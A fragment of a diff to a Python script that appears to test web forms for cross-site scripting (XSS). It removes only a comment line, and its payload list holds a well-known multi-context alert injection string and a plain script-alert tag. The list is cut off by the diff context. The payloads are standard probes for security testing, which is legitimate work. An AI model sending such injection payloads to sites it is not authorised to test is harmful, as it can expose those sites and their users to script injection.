@@ -2,7 +2,6 @@ import requests
 import sys
 
 def test_xss(url, fields):
-    # These are the XSS payloads you provided
     payloads = [
         "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode",
         "<script>alert('xss')</script>",
